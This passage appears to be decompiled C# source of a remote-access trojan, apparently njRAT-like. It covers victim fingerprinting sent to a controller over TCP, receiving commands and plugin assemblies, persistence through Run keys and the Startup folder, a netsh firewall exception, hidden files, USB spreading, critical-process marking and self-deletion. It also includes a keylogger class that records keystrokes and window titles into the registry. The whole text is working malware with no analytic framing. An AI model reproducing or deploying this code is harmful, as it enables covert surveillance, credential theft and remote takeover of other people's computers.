			return BS(ref B);
		}

		public string ENB(ref string s)
		{
			return Convert.ToBase64String(SB(ref s));
		}

		public object GTV(string n, object ret)
		{
			try
			{
				return RuntimeHelpers.GetObjectValue(((ServerComputer)F).get_Registry().get_CurrentUser().OpenSubKey("software\\" + RG)!.GetValue(n, RuntimeHelpers.GetObjectValue(ret)));
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				object objectValue = RuntimeHelpers.GetObjectValue(ret);
				ProjectData.ClearProjectError();
				return objectValue;
			}
		}

		public string HWD()
		{
			try
			{
				string lpRootPathName = Interaction.Environ("systemDrive") + "\\";
				string lpVolumeNameBuffer = null;
				int lpMaximumComponentLength = 0;
				int lpFilesystemCKs = 0;
				string lpFilesystemNameBuffer = null;
				int lpVolumeserialTber = default(int);
				GetVolumeInformation(ref lpRootPathName, ref lpVolumeNameBuffer, 0, ref lpVolumeserialTber, ref lpMaximumComponentLength, ref lpFilesystemCKs, ref lpFilesystemNameBuffer, 0);
				return Conversion.Hex(lpVolumeserialTber);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				string result = "ERR";
				ProjectData.ClearProjectError();
				return result;
			}
		}

		public void DLV(string n)
		{
			try
			{
				Registry.CurrentUser.OpenSubKey("software\\" + RG, writable: true)!.DeleteValue(n);
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}

		public void ED()
		{
			pr(0);
		}

		public string inf()
		{
			string text = "li" + Y;
			try
			{
				if (Operators.ConditionalCompareObjectEqual(GTV("vn", ""), (object)"", false))
				{
					string text2 = text;
					string s = DEB(ref VN) + "_" + HWD();
					text = text2 + ENB(ref s) + Y;
				}
				else
				{
					string text3 = text;
					string s = Conversions.ToString(GTV("vn", ""));
					string s2 = DEB(ref s) + "_" + HWD();
					text = text3 + ENB(ref s2) + Y;
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				string text4 = text;
				string s2 = HWD();
				text = text4 + ENB(ref s2) + Y;
				ProjectData.ClearProjectError();
			}
			try
			{
				string text5 = text;
				string s2 = Environment.MachineName;
				text = text5 + ENB(ref s2) + Y;
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				string text6 = text;
				string s2 = "??";
				text = text6 + ENB(ref s2) + Y;
				ProjectData.ClearProjectError();
			}
			try
			{
				string text7 = text;
				string s2 = Environment.UserName;
				text = text7 + ENB(ref s2) + Y;
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				string text8 = text;
				string s2 = "??";
				text = text8 + ENB(ref s2) + Y;
				ProjectData.ClearProjectError();
			}
			try
			{
				text = text + LO.LastWriteTime.Date.ToString("yy-MM-dd") + Y;
			}
			catch (Exception projectError4)
			{
				ProjectData.SetProjectError(projectError4);
				text = text + "??-??-??" + Y;
				ProjectData.ClearProjectError();
			}
			text = text + "" + Y;
			try
			{
				text += ((ServerComputer)F).get_Info().get_OSFullName().Replace("Microsoft", "")
					.Replace("Windows", "Win")
					.Replace("®", "")
					.Replace("™", "")
					.Replace("  ", " ")
					.Replace(" Win", "Win");
			}
			catch (Exception projectError5)
			{
				ProjectData.SetProjectError(projectError5);
				text += "??";
				ProjectData.ClearProjectError();
			}
			text += "SP";
			try
			{
				string[] array = Strings.Split(Environment.OSVersion.ServicePack, " ", -1, (CompareMethod)0);
				if (array.Length == 1)
				{
					text += "0";
				}
				text += array[checked(array.Length - 1)];
			}
			catch (Exception projectError6)
			{
				ProjectData.SetProjectError(projectError6);
				text += "0";
				ProjectData.ClearProjectError();
			}
			try
			{
				text = ((!Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles).Contains("x86")) ? (text + " x86" + Y) : (text + " x64" + Y));
			}
			catch (Exception projectError7)
			{
				ProjectData.SetProjectError(projectError7);
				text += Y;
				ProjectData.ClearProjectError();
			}
			text = ((!Cam()) ? (text + "No" + Y) : (text + "Yes" + Y));
			text = text + VR + Y + ".." + Y + ACT() + Y;
			string text9 = "";
			try
			{
				string[] valueNames = ((ServerComputer)F).get_Registry().get_CurrentUser().CreateSubKey("software\\" + RG, RegistryKeyPermissionCheck.Default)
					.GetValueNames();
				foreach (string text10 in valueNames)
				{
					if (text10.Length == 32)
					{
						text9 = text9 + text10 + ",";
					}
				}
			}
			catch (Exception projectError8)
			{
				ProjectData.SetProjectError(projectError8);
				ProjectData.ClearProjectError();
			}
			return text + text9;
		}

		public void INS()
		{
			Thread.Sleep(1000);
			if (Idr && !CompDir(LO, new FileInfo(Interaction.Environ(DR).ToLower() + "\\" + EXE.ToLower())))
			{
				try
				{
					if (File.Exists(Interaction.Environ(DR) + "\\" + EXE))
					{
						File.Delete(Interaction.Environ(DR) + "\\" + EXE);
					}
					FileStream fileStream = new FileStream(Interaction.Environ(DR) + "\\" + EXE, FileMode.CreateNew);
					byte[] array = File.ReadAllBytes(LO.FullName);
					fileStream.Write(array, 0, array.Length);
					fileStream.Flush();
					fileStream.Close();
					LO = new FileInfo(Interaction.Environ(DR) + "\\" + EXE);
					Process.Start(LO.FullName);
					ProjectData.EndApp();
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.EndApp();
					ProjectData.ClearProjectError();
				}
			}
			try
			{
				Environment.SetEnvironmentVariable("SEE_MASK_NOZONECHECKS", "1", EnvironmentVariableTarget.User);
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
			try
			{
				Interaction.Shell("netsh firewall add allowedprogram \"" + LO.FullName + "\" \"" + LO.get_Name() + "\" ENABLE", (AppWinStyle)0, false, -1);
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
			if (Isu)
			{
				try
				{
					((ServerComputer)F).get_Registry().get_CurrentUser().OpenSubKey(sf, writable: true)!.SetValue(RG, "\"" + LO.FullName + "\" ..");
				}
				catch (Exception projectError4)
				{
					ProjectData.SetProjectError(projectError4);
					ProjectData.ClearProjectError();
				}
				try
				{
					((ServerComputer)F).get_Registry().get_LocalMachine().OpenSubKey(sf, writable: true)!.SetValue(RG, "\"" + LO.FullName + "\" ..");
				}
				catch (Exception projectError5)
				{
					ProjectData.SetProjectError(projectError5);
					ProjectData.ClearProjectError();
				}
			}
			if (IsF)
			{
				try
				{
					File.Copy(LO.FullName, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + RG + ".exe", overwrite: true);
					FS = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + RG + ".exe", FileMode.Open);
				}
				catch (Exception projectError6)
				{
					ProjectData.SetProjectError(projectError6);
					ProjectData.ClearProjectError();
				}
			}
			if (Spr)
			{
				USBspr(use: true);
			}
			if (Hid)
			{
				try
				{
					FileSystem.SetAttr(LO.FullName, (FileAttribute)2);
				}
				catch (Exception projectError7)
				{
					ProjectData.SetProjectError(projectError7);
					ProjectData.ClearProjectError();
				}
				try
				{
					FileSystem.SetAttr(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + RG + ".exe", (FileAttribute)2);
				}
				catch (Exception projectError8)
				{
					ProjectData.SetProjectError(projectError8);
					ProjectData.ClearProjectError();
				}
			}
		}

		public string md5(byte[] B)
		{
			B = new MD5CryptoServiceProvider().ComputeHash(B);
			string text = "";
			byte[] array = B;
			foreach (byte b in array)
			{
				text += b.ToString("x2");
			}
			return text;
		}

		public object Plugin(byte[] b, string c)
		{
			Module[] modules = Assembly.Load(b).GetModules();
			foreach (Module module in modules)
			{
				Type[] types = module.GetTypes();
				foreach (Type type in types)
				{
					if (type.FullName!.EndsWith("." + c))
					{
						return module.Assembly.CreateInstance(type.FullName);
					}
				}
			}
			return null;
		}

		public byte[] SB(ref string s)
		{
			return Encoding.UTF8.GetBytes(s);
		}

		public void pr(int i)
		{
			try
			{
				NtsetInformationProcess(Process.GetCurrentProcess().Handle, 29, ref i, 4);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}

		public void RC()
		{
			checked
			{
				while (true)
				{
					lastcap = "";
					if (C != null)
					{
						long num = -1L;
						int num2 = 0;
						try
						{
							while (true)
							{
								IL_001b:
								num2++;
								if (num2 == 10)
								{
									num2 = 0;
									Thread.Sleep(1);
								}
								if (!Cn)
								{
									break;
								}
								if (C.Available < 1)
								{
									C.Client.Poll(-1, SelectMode.SelectRead);
								}
								while (C.Available > 0)
								{
									if (num == -1)
									{
										string text = "";
										while (true)
										{
											int num3 = C.GetStream().ReadByte();
											switch (num3)
											{
											case -1:
												break;
											case 0:
												num = Conversions.ToLong(text);
												text = "";
												if (num == 0)
												{
													Send("");
													num = -1L;
												}
												if (C.Available <= 0)
												{
													goto IL_001b;
												}
												goto IL_005a;
											default:
												goto IL_00da;
											}
											break;
											IL_00da:
											text += Strings.ChrW(num3);
										}
										break;
									}
									b = new byte[C.Available + 1 - 1 + 1];
									long num4 = num - MeM.Length;
									if (b.Length > num4)
									{
										b = new byte[(int)(num4 - 1) + 1 - 1 + 1];
									}
									int count = C.Client.Receive(b, 0, b.Length, SocketFlags.None);
									MeM.Write(b, 0, count);
									if (MeM.Length == num)
									{
										num = -1L;
										Thread thread = new Thread(delegate(object a0)
										{
											Ind((byte[])a0);
										}, 1);
										thread.Start(MeM.ToArray());
										thread.Join(100);
										MeM.Dispose();
										MeM = new MemoryStream();
									}
									goto IL_001b;
									IL_005a:;
								}
								break;
							}
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							ProjectData.ClearProjectError();
						}
					}
					do
					{
						try
						{
							if (PLG != null)
							{
								NewLateBinding.LateCall(PLG, (Type)null, "clear", new object[0], (string[])null, (Type[])null, (bool[])null, true);
								PLG = null;
							}
						}
						catch (Exception projectError2)
						{
							ProjectData.SetProjectError(projectError2);
							ProjectData.ClearProjectError();
						}
						Cn = false;
					}
					while (!connect());
					Cn = true;
				}
			}
		}

		public bool Send(string s)
		{
			return Sendb(SB(ref s));
		}

		public bool Sendb(byte[] b)
		{
			//Discarded unreachable code: IL_0091
			if (!Cn)
			{
				return false;
			}
			try
			{
				FileInfo lO = LO;
				lock (lO)
				{
					if (!Cn)
					{
						return false;
					}
					MemoryStream memoryStream = new MemoryStream();
					int num = b.Length;
					string s = Conversions.ToString(num) + "\0";
					byte[] array = SB(ref s);
					memoryStream.Write(array, 0, array.Length);
					memoryStream.Write(b, 0, b.Length);
					C.Client.Send(memoryStream.ToArray(), 0, checked((int)memoryStream.Length), SocketFlags.None);
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				try
				{
					if (Cn)
					{
						Cn = false;
						C.Close();
					}
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
				ProjectData.ClearProjectError();
			}
			return Cn;
		}

		public bool STV(string n, object t, RegistryValueKind typ)
		{
			try
			{
				((ServerComputer)F).get_Registry().get_CurrentUser().CreateSubKey("software\\" + RG)
					.SetValue(n, RuntimeHelpers.GetObjectValue(t), typ);
				return true;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				bool result = false;
				ProjectData.ClearProjectError();
				return result;
			}
		}

		public void UNS()
		{
			pr(0);
			Isu = false;
			if (Spr)
			{
				USBspr(use: false);
			}
			try
			{
				FileSystem.SetAttr(LO.FullName, (FileAttribute)0);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			try
			{
				FileSystem.SetAttr(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + RG + ".exe", (FileAttribute)128);
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
			try
			{
				((ServerComputer)F).get_Registry().get_CurrentUser().OpenSubKey(sf, writable: true)!.DeleteValue(RG, throwOnMissingValue: false);
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
			try
			{
				((ServerComputer)F).get_Registry().get_LocalMachine().OpenSubKey(sf, writable: true)!.DeleteValue(RG, throwOnMissingValue: false);
			}
			catch (Exception projectError4)
			{
				ProjectData.SetProjectError(projectError4);
				ProjectData.ClearProjectError();
			}
			try
			{
				Registry.CurrentUser.OpenSubKey("Software\\", writable: true)!.DeleteSubKeyTree(RG);
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
			try
			{
				Interaction.Shell("netsh firewall delete allowedprogram \"" + LO.FullName + "\"", (AppWinStyle)0, false, -1);
			}
			catch (Exception projectError5)
			{
				ProjectData.SetProjectError(projectError5);
				ProjectData.ClearProjectError();
			}
			try
			{
				if (FS != null)
				{
					FS.Dispose();
					File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + RG + ".exe");
				}
			}
			catch (Exception projectError6)
			{
				ProjectData.SetProjectError(projectError6);
				ProjectData.ClearProjectError();
			}
			try
			{
				((ServerComputer)F).get_Registry().get_CurrentUser().OpenSubKey("software", writable: true)!.DeleteSubKey(RG, throwOnMissingSubKey: false);
			}
			catch (Exception projectError7)
			{
				ProjectData.SetProjectError(projectError7);
				ProjectData.ClearProjectError();
			}
			try
			{
				Interaction.Shell("cmd.exe /c ping 0 -n 2 & del \"" + LO.FullName + "\"", (AppWinStyle)0, false, -1);
			}
			catch (Exception projectError8)
			{
				ProjectData.SetProjectError(projectError8);
				ProjectData.ClearProjectError();
			}
			ProjectData.EndApp();
		}

		public byte[] ZIP(byte[] B)
		{
			MemoryStream memoryStream = new MemoryStream(B);
			GZipStream gZipStream = new GZipStream(memoryStream, CompressionMode.Decompress);
			byte[] array = new byte[4];
			checked
			{
				memoryStream.Position = memoryStream.Length - 5;
				memoryStream.Read(array, 0, 4);
				int num = BitConverter.ToInt32(array, 0);
				memoryStream.Position = 0L;
				byte[] array2 = new byte[num - 1 + 1 - 1 + 1];
				gZipStream.Read(array2, 0, num);
				gZipStream.Dispose();
				memoryStream.Dispose();
				return array2;
			}
		}
	}
	public class kl
	{
		private int LastAV;

		private string LastAS;

		private Keys lastKey;

		public Clock Clock;

		public string Logs;

		private object keyboard;

		public int Klen;

		public string RG;

		public kl()
		{
			//IL_0008: Unknown result type (might be due to invalid IL or missing references)
			//IL_000e: Unknown result type (might be due to invalid IL or missing references)
			//IL_0018: Expected O, but got Unknown
			//IL_0024: Unknown result type (might be due to invalid IL or missing references)
			//IL_002e: Expected O, but got Unknown
			lastKey = (Keys)0;
			Clock = new Clock();
			Logs = "";
			keyboard = (object)new Keyboard();
			Klen = 20;
			RG = "RG";
		}

		[DllImport("user32.dll")]
		private static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out][MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);

		[DllImport("user32.dll")]
		private static extern bool GetKeyboardState(byte[] lpKeyState);

		[DllImport("user32.dll")]
		private static extern uint MapVirtualKey(uint uCode, uint uMapType);

		[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int GetWindowThreadProcessId(IntPtr hwnd, ref int lpdwProcessID);

		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int GetKeyboardLayout(int dwLayout);

		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern IntPtr GetForegroundWindow();

		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern short GetAsyncKeyState(int vKey);

		private string AV()
		{
			try
			{
				IntPtr foregroundWindow = GetForegroundWindow();
				int lpdwProcessID = default(int);
				GetWindowThreadProcessId(foregroundWindow, ref lpdwProcessID);
				object processById = Process.GetProcessById(lpdwProcessID);
				if (!Conversions.ToBoolean(Operators.OrObject(Operators.AndObject((object)(foregroundWindow.ToInt32() == LastAV), Operators.CompareObjectEqual((object)LastAS, NewLateBinding.LateGet(processById, (Type)null, "MainWindowTitle", new object[0], (string[])null, (Type[])null, (bool[])null), false)), Operators.CompareObjectEqual(NewLateBinding.LateGet(NewLateBinding.LateGet(processById, (Type)null, "MainWindowTitle", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Length", new object[0], (string[])null, (Type[])null, (bool[])null), (object)0, false))))
				{
					LastAV = foregroundWindow.ToInt32();
					LastAS = Conversions.ToString(NewLateBinding.LateGet(processById, (Type)null, "MainWindowTitle", new object[0], (string[])null, (Type[])null, (bool[])null));
					return Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat("\r\n\u0001" + HM(), " "), NewLateBinding.LateGet(processById, (Type)null, "ProcessName", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)" "), (object)LastAS), (object)'\u0001'), (object)"\r\n"));
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
			return "";
		}

		private string HM()
		{
			try
			{
				return Clock.get_LocalTime().ToString("yy/MM/dd");
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				string result = "??/??/??";
				ProjectData.ClearProjectError();
				return result;
			}
		}

		private static string VKCodeToUnicode(uint VKCode)
		{
			try
			{
				StringBuilder stringBuilder = new StringBuilder();
				byte[] lpKeyState = new byte[255];
				if (!GetKeyboardState(lpKeyState))
				{
					return "";
				}
				uint wScanCode = MapVirtualKey(VKCode, 0u);
				IntPtr foregroundWindow = GetForegroundWindow();
				int lpdwProcessID = 0;
				int windowThreadProcessId = GetWindowThreadProcessId(foregroundWindow, ref lpdwProcessID);
				IntPtr dwhkl = (IntPtr)GetKeyboardLayout(windowThreadProcessId);
				ToUnicodeEx(VKCode, wScanCode, lpKeyState, stringBuilder, 5, 0u, dwhkl);
				return stringBuilder.ToString();
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
			return ((Enum)(Keys)checked((int)VKCode)).ToString();
		}

		private string Fix(Keys k)
		{
			//IL_0051: Unknown result type (might be due to invalid IL or missing references)
			//IL_0052: Unknown result type (might be due to invalid IL or missing references)
			//IL_0053: Unknown result type (might be due to invalid IL or missing references)
			//IL_0056: Invalid comparison between Unknown and I4
			//IL_0058: Unknown result type (might be due to invalid IL or missing references)
			//IL_005b: Invalid comparison between Unknown and I4
			//IL_005d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0060: Invalid comparison between Unknown and I4
			//IL_0062: Unknown result type (might be due to invalid IL or missing references)
			//IL_0065: Invalid comparison between Unknown and I4
			//IL_0067: Unknown result type (might be due to invalid IL or missing references)
			//IL_006a: Invalid comparison between Unknown and I4
			//IL_006c: Unknown result type (might be due to invalid IL or missing references)
			//IL_006f: Invalid comparison between Unknown and I4
			//IL_0071: Unknown result type (might be due to invalid IL or missing references)
			//IL_0074: Invalid comparison between Unknown and I4
			//IL_0076: Unknown result type (might be due to invalid IL or missing references)
			//IL_0079: Invalid comparison between Unknown and I4
			//IL_007b: Unknown result type (might be due to invalid IL or missing references)
			//IL_007e: Invalid comparison between Unknown and I4
			//IL_0080: Unknown result type (might be due to invalid IL or missing references)
			//IL_0083: Invalid comparison between Unknown and I4
			//IL_0085: Unknown result type (might be due to invalid IL or missing references)
			//IL_0088: Invalid comparison between Unknown and I4
			//IL_008a: Unknown result type (might be due to invalid IL or missing references)
			//IL_008d: Invalid comparison between Unknown and I4
			//IL_008f: Unknown result type (might be due to invalid IL or missing references)
			//IL_0092: Invalid comparison between Unknown and I4
			//IL_0094: Unknown result type (might be due to invalid IL or missing references)
			//IL_0097: Invalid comparison between Unknown and I4
			//IL_0099: Unknown result type (might be due to invalid IL or missing references)
			//IL_009b: Invalid comparison between Unknown and I4
			//IL_00a2: Unknown result type (might be due to invalid IL or missing references)
			//IL_00bd: Unknown result type (might be due to invalid IL or missing references)
			//IL_00c3: Invalid comparison between Unknown and I4
			//IL_00c5: Unknown result type (might be due to invalid IL or missing references)
			//IL_00cb: Invalid comparison between Unknown and I4
			//IL_00cd: Unknown result type (might be due to invalid IL or missing references)
			//IL_00d3: Invalid comparison between Unknown and I4
			//IL_00d5: Unknown result type (might be due to invalid IL or missing references)
			//IL_00d8: Invalid comparison between Unknown and I4
			//IL_00da: Unknown result type (might be due to invalid IL or missing references)
			//IL_00e0: Invalid comparison between Unknown and I4
			//IL_00e2: Unknown result type (might be due to invalid IL or missing references)
			//IL_00e5: Invalid comparison between Unknown and I4
			//IL_00e7: Unknown result type (might be due to invalid IL or missing references)
			//IL_00ed: Invalid comparison between Unknown and I4
			//IL_00ef: Unknown result type (might be due to invalid IL or missing references)
			//IL_00f5: Invalid comparison between Unknown and I4
			//IL_00f7: Unknown result type (might be due to invalid IL or missing references)
			//IL_00fd: Invalid comparison between Unknown and I4
			//IL_010a: Unknown result type (might be due to invalid IL or missing references)
			//IL_010d: Invalid comparison between Unknown and I4
			//IL_011a: Unknown result type (might be due to invalid IL or missing references)
			//IL_011d: Invalid comparison between Unknown and I4
			//IL_011f: Unknown result type (might be due to invalid IL or missing references)
			//IL_0122: Invalid comparison between Unknown and I4
			//IL_0146: Unknown result type (might be due to invalid IL or missing references)
			//IL_0149: Invalid comparison between Unknown and I4
			//IL_0156: Unknown result type (might be due to invalid IL or missing references)
			//IL_0165: Unknown result type (might be due to invalid IL or missing references)
			//IL_0179: Unknown result type (might be due to invalid IL or missing references)
			//IL_017f: Expected I4, but got Unknown
			//IL_0195: Unknown result type (might be due to invalid IL or missing references)
			//IL_019b: Expected I4, but got Unknown
			bool flag = Conversions.ToBoolean(NewLateBinding.LateGet(keyboard, (Type)null, "ShiftKeyDown", new object[0], (string[])null, (Type[])null, (bool[])null));
			if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(keyboard, (Type)null, "CapsLock", new object[0], (string[])null, (Type[])null, (bool[])null), (object)true, false))
			{
				flag = ((!flag) ? true : false);
			}
			try
			{
				if ((int)k == 112 || (int)k == 113 || (int)k == 114 || (int)k == 115 || (int)k == 116 || (int)k == 117 || (int)k == 118 || (int)k == 119 || (int)k == 120 || (int)k == 121 || (int)k == 122 || (int)k == 123 || (int)k == 35 || (int)k == 46 || (int)k == 8)
				{
					return "[" + ((Enum)k).ToString() + "]";
				}
				if ((int)k == 160 || (int)k == 161 || (int)k == 65536 || (int)k == 16 || (int)k == 131072 || (int)k == 17 || (int)k == 163 || (int)k == 162 || (int)k == 262144)
				{
					return "";
				}
				if ((int)k == 32)
				{
					return " ";
				}
				if ((int)k == 13 || (int)k == 13)
				{
					if (Logs.EndsWith("[ENTER]\r\n"))
					{
						return "";
					}
					return "[ENTER]\r\n";
				}
				if ((int)k == 9)
				{
					return "[TAP]\r\n";
				}
				checked
				{
					if (flag)
					{
						return VKCodeToUnicode((uint)k).ToUpper();
					}
					return VKCodeToUnicode((uint)k);
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				string result;
				if (flag)
				{
					result = Strings.ChrW((int)k).ToString().ToUpper();
					ProjectData.ClearProjectError();
					return result;
				}
				result = Strings.ChrW((int)k).ToString().ToLower();
				ProjectData.ClearProjectError();
				return result;
			}
		}

		public void WRK()
		{
			//IL_0069: Unknown result type (might be due to invalid IL or missing references)
			//IL_006b: Unknown result type (might be due to invalid IL or missing references)
			//IL_00a5: Unknown result type (might be due to invalid IL or missing references)
			//IL_00a6: Unknown result type (might be due to invalid IL or missing references)
			if (Klen == 0)
			{
				Klen = 20;
			}
			try
			{
				Logs = Conversions.ToString(Registry.CurrentUser.CreateSubKey("Software\\" + RG).GetValue("kl", ""));
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			checked
			{
				try
				{
					int num = 0;
					while (true)
					{
						num++;
						int num2 = 0;
						do
						{
							if (GetAsyncKeyState(num2) == -32767)
							{
								Keys k = (Keys)num2;
								string text = Fix(k);
								if (text.Length > 0)
								{
									Logs += AV();
									Logs += text;
								}
								lastKey = k;
							}
							num2++;
						}
						while (num2 <= 255);
						if (num == 1000)
						{
							num = 0;
							int num3 = Klen * 1024;
							if (Logs.Length > num3)
							{
								Logs = Logs.Remove(0, Logs.Length - num3);
							}
							try
							{
								Registry.CurrentUser.CreateSubKey("Software\\" + RG).SetValue("kl", Logs);
							}
							catch (Exception projectError2)
							{
								ProjectData.SetProjectError(projectError2);
								ProjectData.ClearProjectError();
							}
						}
						Thread.Sleep(1);
					}
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					Exception ex2 = ex;
					ProjectData.ClearProjectError();
				}
			}
		}
	}
}
